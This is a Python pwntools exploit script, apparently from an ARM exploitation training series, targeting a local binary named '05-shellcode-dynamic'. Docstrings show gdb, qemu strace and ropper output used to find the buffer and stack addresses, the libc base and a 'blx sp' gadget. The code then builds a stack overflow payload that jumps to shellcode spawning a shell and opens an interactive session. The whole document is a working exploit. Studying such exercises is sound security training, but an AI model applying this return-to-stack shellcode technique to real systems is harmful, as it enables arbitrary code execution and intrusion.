#!/usr/bin/python

"""
(gdb) disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x00010490 <+0>:	push	{r7, lr}
...
   0x000104d0 <+64>:	pop	{r7, pc}
End of assembler dump.
(gdb) b *0x000104d0
Breakpoint 1 at 0x104d0: file src/05-shellcode-dynamic.c, line 14.
(gdb) c
Continuing.

Breakpoint 1, 0x000104d0 in vulnerable () at src/05-shellcode-dynamic.c:14
14	}
(gdb) p &buffer[0]
$1 = 0xfffeef00 'a' <repeats 132 times>, "WSt\377"
(gdb) i r $sp
sp             0xfffeef80	0xfffeef80
"""

"""
$ qemu-arm -L /usr/arm-linux-gnueabihf/ -strace ./bin/arm/05-shellcode-dynamic
...
18200 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
18200 mmap2(NULL,1013128,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0xff6a9000
...
"""

"""
$ ropper --nocolor --file /usr/arm-linux-gnueabihf/lib/libc-2.27.so
0x00008b28 (0x00008b29): blx sp;
"""

import struct
import sys

from pwn import *

context(arch='arm', os='linux', endian='little', word_size=32)

binary_path = './bin/arm/05-shellcode-dynamic'

saved_pc_addr = 0xfffeef80 + 4
buffer_addr = 0xfffeef00
libc_addr = 0xff6a9000

blx_sp_addr = libc_addr + 0x00008b29

shellcode = asm(shellcraft.sh())

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p32(blx_sp_addr)
payload += shellcode

p.readuntil('> ')
p.write(payload)
p.interactive()
